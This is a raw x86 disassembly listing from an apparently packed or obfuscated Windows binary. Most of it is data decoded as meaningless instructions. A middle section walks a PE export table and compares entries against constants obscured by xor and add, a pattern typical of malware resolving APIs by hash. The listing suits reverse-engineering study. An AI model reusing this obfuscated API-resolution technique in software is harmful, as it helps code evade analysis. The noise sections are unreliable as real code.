  406273:	out    dx,al
  406274:	daa    
  406275:	jno    0x406239
  406277:	push   esp
  406278:	push   DWORD PTR [edx+ebp*2]
  40627b:	push   0xffffffb5
  40627d:	inc    edx
  40627e:	cmp    eax,0xfde0982f
  406283:	(bad)  
  406284:	and    al,0x1a
  406286:	lds    edi,FWORD PTR [edx+0x16]
  406289:	and    ch,BYTE PTR [ebp+0x65ad6b2c]
  40628f:	sbb    esi,DWORD PTR [esp+edx*4-0x141567d9]
  406296:	dec    ebx
  406297:	xchg   ebp,eax
  406298:	xor    BYTE PTR [ecx-0x51],0x62
  40629c:	pop    ebp
  40629d:	fcomp  QWORD PTR [edx-0x3b3f29f4]
  4062a3:	arpl   WORD PTR ds:0xcfae7cd6,cx
  4062a9:	std    
  4062aa:	adc    BYTE PTR ds:0xe59c4e97,cl
  4062b0:	ja     0x40623f
  4062b2:	pop    ss
  4062b3:	cmp    eax,ebx
  4062b5:	pusha  
  4062b6:	sub    al,0xae
  4062b8:	jo     0x4062a8
  4062ba:	jo     0x4062c7
  4062bc:	div    bh
  4062be:	pcmpeqw mm0,QWORD PTR [edx]
  4062c1:	cmp    esi,DWORD PTR [esi+0x1fee7d94]
  4062c7:	and    esp,ebx
  4062c9:	push   ebp
  4062ca:	and    BYTE PTR [ecx+0x36fae500],al
  4062d0:	mov    DWORD PTR [edi+0x659ee0a6],esi
  4062d6:	inc    edx
  4062d7:	xor    DWORD PTR [ecx+0xd],esp
  4062da:	push   es
  4062db:	jbe    0x406312
  4062dd:	or     eax,DWORD PTR [edi+edx*8-0xf6131e4]
  4062e4:	scas   al,BYTE PTR es:[edi]
  4062e5:	cmp    eax,0xc6ee576f
  4062ea:	ds (bad) 
  4062ec:	fistp  DWORD PTR [ecx]
  4062ee:	or     eax,0x96c55e36
  4062f3:	jp     0x4062a7
  4062f5:	mov    esp,DWORD PTR [ebx]
  4062f7:	call   0x22a0d0cc
  4062fc:	shr    BYTE PTR gs:[esi-0x3f],1
  406300:	retf   0x2af5
  406303:	mov    edi,0xb55c938c
  406308:	outs   dx,DWORD PTR ds:[esi]
  406309:	mov    cs,WORD PTR [ecx]
  40630b:	and    al,0x11
  40630d:	dec    ebx
  40630e:	mov    WORD PTR [eax-0x3299c676],cs
  406314:	sub    esp,DWORD PTR [edi+0x294edf48]
  40631a:	push   ebp
  40631b:	mov    ch,0x8f
  40631d:	fsubr  QWORD PTR [ecx+0x7f3e5e01]
  406323:	or     bh,BYTE PTR [esi]
  406325:	outs   dx,DWORD PTR ds:[esi]
  406326:	repz xchg edi,eax
  406328:	adc    eax,0x4f60c597
  40632d:	lock cmc 
  40632f:	inc    ebp
  406330:	(bad)  
  406331:	retf   
  406332:	mov    al,ds:0x2ba13476
  406337:	add    BYTE PTR [ebp+0x2b],cl
  40633a:	fs mov dh,0xa4
  40633d:	fistp  QWORD PTR [ebp-0x71]
  406340:	sub    ch,BYTE PTR [ecx]
  406342:	push   cs
  406343:	test   BYTE PTR [esi],al
  406345:	aaa    
  406346:	push   esi
  406347:	xchg   BYTE PTR [ebx+0x3],cl
  40634a:	call   0x74a627b2
  40634f:	lods   al,BYTE PTR gs:[esi]
  406351:	add    eax,0x761c59fd
  406356:	dec    ebp
  406357:	push   eax
  406358:	fisubr DWORD PTR [eax-0x45]
  40635b:	std    
  40635c:	sub    DWORD PTR [edx+0x7616c696],0xffffffc0
  406363:	fisubr DWORD PTR [eax+0x75]
  406366:	cwde   
  406367:	and    BYTE PTR ds:0x39ddd590,dh
  40636d:	inc    esi
  40636e:	add    DWORD PTR [esi-0x33],0xffffffa9
  406372:	fnstsw WORD PTR [eax+0xd]
  406375:	add    BYTE PTR [esi+0x38],0xa4
  406379:	xor    al,bl
  40637b:	lods   al,BYTE PTR ds:[esi]
  40637c:	and    DWORD PTR [edx+0x3e],0x726b0f4f
  406383:	repnz sbb al,0xaf
  406386:	imul   eax,esi,0xffffffb2
  406389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40638a:	scas   eax,DWORD PTR es:[edi]
  40638b:	mov    ds:0xc361a353,eax
  406390:	jecxz  0x4063e5
  406392:	mov    ecx,0xcb6c6567
  406397:	(bad)  
  406398:	rol    dh,cl
  40639a:	mov    bh,0xda
  40639c:	(bad)  
  40639d:	inc    DWORD PTR [esi-0x63]
  4063a0:	pop    ds
  4063a1:	int    0x7e
  4063a3:	(bad)  
  4063a5:	repz aam 0x59
  4063a8:	or     bh,BYTE PTR [edi]
  4063aa:	sbb    dl,BYTE PTR [ebp+0x54]
  4063ad:	bound  edi,QWORD PTR [edx-0x4]
  4063b0:	cld    
  4063b1:	fld    QWORD PTR [ebx+0x420e9f4f]
  4063b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b8:	or     DWORD PTR [ecx-0x21],0x35
  4063bc:	jo     0x406415
  4063be:	or     ch,ah
  4063c0:	mov    ah,0x4c
  4063c2:	add    eax,0x7fd366e
  4063c7:	repnz mov eax,0xee01fa36
  4063cd:	neg    ch
  4063cf:	cmp    eax,0x8e1aa6cd
  4063d4:	or     al,0x7a
  4063d6:	sub    al,0x66
  4063d8:	lahf   
  4063d9:	cwde   
  4063da:	test   DWORD PTR [ebx-0x65389a6e],esi
  4063e0:	adc    esi,edi
  4063e2:	dec    esi
  4063e3:	scas   eax,DWORD PTR es:[edi]
  4063e4:	jecxz  0x406421
  4063e6:	aad    0xe8
  4063e8:	stos   DWORD PTR es:[edi],eax
  4063e9:	xchg   ecx,eax
  4063ea:	or     esp,DWORD PTR [esi+ebp*2]
  4063ed:	data16 sbb ah,dh
  4063f0:	les    esp,FWORD PTR ds:0xe2d1acfa
  4063f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063f7:	pop    ebp
  4063f8:	test   al,0x27
  4063fa:	sbb    BYTE PTR [ebx+0x6e],0xa5
  4063fe:	jnp    0x406386
  406400:	push   DWORD PTR [ebp+0x1e]
  406403:	push   ecx
  406404:	mov    BYTE PTR [ecx+0x40f2c9d7],dh
  40640a:	std    
  40640b:	imul   ebp,DWORD PTR [edx],0xfffffffc
  40640e:	or     ah,BYTE PTR [ecx-0x3f]
  406411:	jbe    0x406460
  406413:	icebp  
  406414:	(bad)  
  406415:	xchg   edi,eax
  406416:	stos   BYTE PTR es:[edi],al
  406417:	xchg   edi,eax
  406418:	daa    
  406419:	mov    dh,0x19
  40641b:	jmp    0x40644c
  40641d:	daa    
  40641e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40641f:	push   0x8ed4ac9e
  406424:	mov    eax,0x397ab180
  406429:	fs fcomi st,st(1)
  40642c:	int    0xe4
  40642e:	test   BYTE PTR fs:[edx+0x1b],ch
  406432:	rol    ebp,cl
  406434:	loop   0x4064b2
  406436:	mov    eax,0x89d5ecba
  40643b:	sub    al,0x76
  40643d:	arpl   WORD PTR es:[eax+0x4ff055d7],ax
  406444:	push   edi
  406445:	sbb    BYTE PTR [edi-0x23455686],dl
  40644b:	into   
  40644c:	shl    DWORD PTR [ecx],1
  40644e:	inc    edi
  40644f:	jmp    0x4063d5
  406451:	mov    edx,ecx
  406453:	(bad)  
  406454:	std    
  406455:	hlt    
  406456:	adc    eax,0x3e5ab977
  40645b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40645c:	jb     0x406402
  40645e:	arpl   WORD PTR [edi-0x3659e178],dx
  406464:	outs   dx,BYTE PTR ds:[esi]
  406465:	jmp    0x40643a
  406467:	pop    esi
  406468:	sbb    eax,0xa4e17325
  40646d:	push   ebx
  40646e:	or     al,0xec
  406470:	mov    bl,0x6c
  406472:	mov    al,ds:0x5ab5d2ea
  406477:	mov    ds,WORD PTR [eax-0x4c]
  40647a:	pop    ss
  40647b:	or     dh,BYTE PTR [ebp-0x6cb43191]
  406481:	jnp    0x40640b
  406483:	sbb    al,0xb5
  406485:	jp     0x406502
  406487:	mov    esi,0xdf822633
  40648c:	sbb    BYTE PTR [edx+0x23],bh
  40648f:	or     al,0x5e
  406491:	inc    edi
  406492:	adc    eax,0x71aaf1ca
  406497:	inc    ebp
  406498:	popa   
  406499:	stos   BYTE PTR es:[edi],al
  40649a:	xchg   esp,eax
  40649b:	add    BYTE PTR ds:[eax],cl
  40649e:	mov    ah,0xa7
  4064a0:	mov    ecx,0x3471d026
  4064a5:	jg     0x4064f4
  4064a7:	aas    
  4064a8:	fdiv   st(3),st
  4064aa:	call   0x9d8e374f
  4064af:	ss adc eax,edx
  4064b2:	(bad)  
  4064b3:	fwait
  4064b4:	lds    edi,FWORD PTR fs:[esi-0x6a756d60]
  4064bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064bc:	sar    BYTE PTR [ebp+0x66470a85],1
  4064c2:	sbb    DWORD PTR [edi],ebp
  4064c4:	add    DWORD PTR [eax-0x5bf601b],esp
  4064ca:	retf   0x55f7
  4064cd:	dec    edi
  4064ce:	xchg   ebp,eax
  4064cf:	jp     0x406545
  4064d1:	aas    
  4064d2:	jbe    0x4064fc
  4064d4:	es push eax
  4064d6:	push   ebx
  4064d7:	test   esp,esi
  4064d9:	ins    DWORD PTR es:[edi],dx
  4064da:	jg     0x406508
  4064dc:	inc    esp
  4064dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064de:	(bad)  
  4064df:	xor    eax,0xaaa9d4e
  4064e4:	shr    BYTE PTR [ecx],1
  4064e6:	out    dx,al
  4064e7:	push   es
  4064e8:	icebp  
  4064e9:	je     0x406480
  4064eb:	les    ecx,FWORD PTR [ecx]
  4064ed:	fisubr DWORD PTR [eax+0x33c5c715]
  4064f3:	out    dx,eax
  4064f4:	addr16 pushf 
  4064f6:	pop    ss
  4064f7:	push   cs
  4064f8:	mov    ebp,0xe9989092
  4064fd:	mov    ch,0xe4
  4064ff:	stos   BYTE PTR es:[edi],al
  406500:	fwait
  406501:	jecxz  0x406573
  406503:	mov    al,BYTE PTR [ecx+0x64dcaefa]
  406509:	(bad)
  40650c:	daa    
  40650d:	std    
  40650e:	xor    bl,dl
  406510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406511:	retf   0xe083
  406514:	stos   DWORD PTR es:[edi],eax
  406515:	mov    edx,0xc1f80da2
  40651a:	sub    BYTE PTR [ebx],ah
  40651c:	loopne 0x40655e
  40651e:	shl    DWORD PTR [edi],1
  406520:	repz jne 0x406534
  406523:	mov    ds:0x97eccd36,eax
  406528:	and    dl,cl
  40652a:	xchg   ebx,eax
  40652b:	fld    TBYTE PTR [eax]
  40652d:	adc    eax,0x63fd45cd
  406532:	dec    eax
  406533:	fsubr  QWORD PTR [esi]
  406535:	rol    ebp,1
  406537:	jne    0x4064e4
  406539:	cs adc al,0x89
  40653c:	stos   BYTE PTR es:[edi],al
  40653d:	mov    eax,0x3984a491
  406542:	sbb    BYTE PTR [ecx+0xb345a5c],dh
  406548:	xchg   esi,eax
  406549:	xor    eax,0x1cab8d07
  40654e:	push   edx
  40654f:	clc    
  406550:	add    DWORD PTR [ecx],0x41
  406553:	xchg   esi,eax
  406554:	xor    eax,0x1372870b
  406559:	pop    esi
  40655a:	(bad)  ds:0x3674ba3
  406560:	out    dx,al
  406561:	stc    
  406562:	test   ah,cl
  406564:	xchg   ebp,eax
  406565:	xchg   ebx,eax
  406566:	ss sub al,0x25
  406569:	xchg   edi,eax
  40656a:	cld    
  40656b:	jmp    0xe77a3565
  406570:	sbb    al,0x10
  406572:	mov    edi,0xa6ba38ca
  406577:	mov    edi,DWORD PTR [ecx]
  406579:	adc    al,0x43
  40657b:	pop    ss
  40657c:	retf   
  40657d:	xchg   ebp,eax
  40657e:	icebp  
  40657f:	(bad)  
  406580:	and    edi,esp
  406582:	mov    ds:0xdc8c7e9,eax
  406587:	sar    ch,cl
  406589:	jecxz  0x4065c5
  40658b:	shl    BYTE PTR [edi],1
  40658d:	mov    ds:0x815b220b,eax
  406592:	xchg   bh,bh
  406594:	call   DWORD PTR [esi+0x9]
  406597:	cmp    al,0x43
  406599:	(bad)  
  40659a:	fiadd  WORD PTR [ecx-0x20f584a4]
  4065a0:	icebp  
  4065a1:	jl     0x4065ec
  4065a3:	sub    DWORD PTR [esi+0x2d],eax
  4065a6:	pop    ds
  4065a7:	out    dx,eax
  4065a8:	in     eax,dx
  4065a9:	xchg   DWORD PTR [eax+ebp*8+0x1c71b1f],ecx
  4065b0:	add    DWORD PTR [edi+eiz*2],ebx
  4065b3:	scas   eax,DWORD PTR es:[edi]
  4065b4:	out    dx,al
  4065b5:	loop   0x40657f
  4065b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065b8:	pop    eax
  4065b9:	in     al,0xd7
  4065bb:	fnstsw WORD PTR [edx-0x2a357eb1]
  4065c1:	in     al,0xb8
  4065c3:	jge    0x406610
  4065c5:	push   ebx
  4065c6:	lea    ebp,[ebp+esi*2-0x39dc8daf]
  4065cd:	les    esp,FWORD PTR [ebx+0x99eb47e]
  4065d3:	lods   al,BYTE PTR ds:[esi]
  4065d4:	lods   al,BYTE PTR ds:[esi]
  4065d5:	add    esp,DWORD PTR [ebx+0x235d64c8]
  4065db:	jge    0x406640
  4065dd:	or     al,0x1f
  4065df:	and    dh,BYTE PTR [eax-0x6e]
  4065e2:	fld    QWORD PTR [ebx]
  4065e4:	push   ds
  4065e5:	in     al,dx
  4065e6:	dec    esp
  4065e7:	icebp  
  4065e8:	adc    BYTE PTR [ebp-0x3272da6a],cl
  4065ee:	inc    DWORD PTR [ecx+0x4260001d]
  4065f4:	add    BYTE PTR [eax+edx*4],cl
  4065f7:	inc    edx
  4065f8:	add    BYTE PTR [ebx],dh
  4065fa:	retf   
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d21c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42004f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1e4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x2a],0x1b
  4069c2:	sbb    ebx,DWORD PTR [edx+eax*8]
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x2a]
  4069cd:	rol    edi,0xce
  4069d0:	scas   al,BYTE PTR es:[edi]
  4069d1:	retf   
  4069d2:	inc    ecx
  4069d3:	inc    eax
  4069d4:	nop
  4069d5:	arpl   WORD PTR [eax-0x4],dx
  4069d8:	mov    DWORD PTR [ebx-0xc],0x6e8bdb5d
  4069df:	mov    ds:0x1a42637c,al
  4069e4:	test   al,0xaf
  4069e6:	and    DWORD PTR [eax+0x3b7d9031],esp
  4069ec:	out    dx,al
  4069ed:	inc    edx
  4069ee:	sub    esp,DWORD PTR [ecx]
  4069f0:	outs   dx,BYTE PTR ds:[esi]
  4069f1:	out    dx,eax
  4069f2:	jl     0x40697e
  4069f4:	sbb    al,0xa5
  4069f6:	xchg   esp,eax
  4069f7:	dec    esp
  4069f8:	xchg   edi,eax
  4069f9:	mov    esp,0x3397dfaf
  4069fe:	shl    DWORD PTR [edx-0x5d5c621d],1
  406a04:	int    0x5f
  406a06:	das    
  406a07:	jne    0x406a73
  406a09:	sti    
  406a0a:	addr16 mov edi,0xf0d9ffe4
  406a10:	je     0x406997
  406a12:	(bad)  
  406a13:	xor    al,0x96
  406a15:	int    0xec
  406a17:	pop    eax
  406a18:	push   esi
  406a19:	xor    dh,BYTE PTR [ecx]
  406a1b:	push   cs
  406a1c:	dec    ecx
  406a1d:	or     eax,0xa954283c
  406a22:	push   esi
  406a23:	imul   ebx,DWORD PTR [edi-0x2ee251ae],0x4b
  406a2a:	repnz outs dx,DWORD PTR ds:[esi]
  406a2c:	xchg   edx,eax
  406a2d:	xchg   edi,eax
  406a2e:	outs   dx,BYTE PTR gs:[esi]
  406a30:	and    eax,0x5f4dc4f8
  406a35:	cmp    esp,0x2edec3e2
  406a3b:	imul   ebp,DWORD PTR [ecx],0xffffff86
  406a3e:	pop    esi
  406a3f:	nop
  406a40:	inc    ebp
  406a41:	jge    0x4069ea
  406a43:	xor    ecx,edx
  406a45:	cwde   
  406a46:	sbb    edx,DWORD PTR [esi-0x24]
  406a49:	sbb    al,0x2b
  406a4b:	dec    esi
  406a4c:	adc    BYTE PTR ds:0x6b494691,al
  406a52:	push   es
  406a53:	mov    BYTE PTR [ebx],0x4c
  406a56:	xchg   ebp,eax
  406a57:	dec    ebx
  406a58:	mov    esi,0x70b255ec
  406a5d:	lahf   
  406a5e:	sti    
  406a5f:	icebp  
  406a60:	cmp    esi,ebp
  406a62:	inc    ecx
  406a63:	ja     0x406a2b
  406a65:	aam    0xc
  406a67:	stos   DWORD PTR es:[edi],eax
  406a68:	in     al,0x99
  406a6a:	push   0xffffffc8
  406a6c:	xchg   BYTE PTR [eax+eax*1-0x46],dh
  406a70:	(bad)  
  406a71:	xor    si,si
  406a74:	push   esp
  406a75:	stos   DWORD PTR es:[edi],eax
  406a76:	sub    DWORD PTR [eax+ebp*4+0x26],edi
  406a7a:	pop    ebx
  406a7b:	sbb    bh,BYTE PTR [edi+0x79]
  406a7e:	xchg   esp,eax
  406a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a80:	dec    ebx
  406a81:	ret    
  406a82:	xor    DWORD PTR [esi],0xffffff80
  406a85:	fmul   QWORD PTR [ebx]
  406a87:	fstp   TBYTE PTR [ebx-0x4e49d9b2]
  406a8d:	inc    ecx
  406a8e:	jp     0x406a2b
  406a90:	stos   BYTE PTR es:[edi],al
  406a91:	leave  
  406a92:	pop    ebp
  406a93:	call   0xccd76574
  406a98:	mov    edi,0xc947b54e
  406a9d:	add    dh,BYTE PTR [edi-0x46]
  406aa0:	mov    cl,0x4b
  406aa2:	dec    edx
  406aa3:	sbb    ch,bl
  406aa5:	cli    
  406aa6:	jns    0x406a62
  406aa8:	add    al,0x91
  406aaa:	shl    BYTE PTR ds:0x3083bbdf,1
  406ab0:	jns    0x406b11
  406ab2:	mov    al,ds:0x921039a6
  406ab7:	rcr    edi,cl
  406ab9:	mov    ?,ebx
  406abb:	mov    eax,ds:0xde66d2e9
  406ac0:	and    DWORD PTR [edi],edi
  406ac2:	adc    ch,BYTE PTR [esi+esi*4+0x31619a9f]
  406ac9:	mov    dl,0xa0
  406acb:	push   0x10
  406acd:	adc    ebx,ecx
  406acf:	mov    edx,0x2db13573
  406ad4:	inc    ebp
  406ad5:	mov    BYTE PTR [ecx+0x6f],ch
  406ad8:	(bad)  
  406ad9:	mov    ebx,0xa3dd124b
  406ade:	dec    edx
  406adf:	push   edi
  406ae0:	push   ss
  406ae1:	and    edi,DWORD PTR [ecx-0x4a]
  406ae4:	sbb    DWORD PTR fs:0xa4ab0eaf,eax
  406aeb:	pop    es
  406aec:	div    ebp
  406aee:	inc    edi
  406aef:	and    BYTE PTR [edx+ebp*8+0x1c],bl
  406af3:	(bad)  
  406af4:	adc    ebx,DWORD PTR [ebp+0x539a7fa4]
  406afa:	sub    al,BYTE PTR [edi-0x2a783df8]
  406b00:	sbb    esi,DWORD PTR [edx-0x5a]
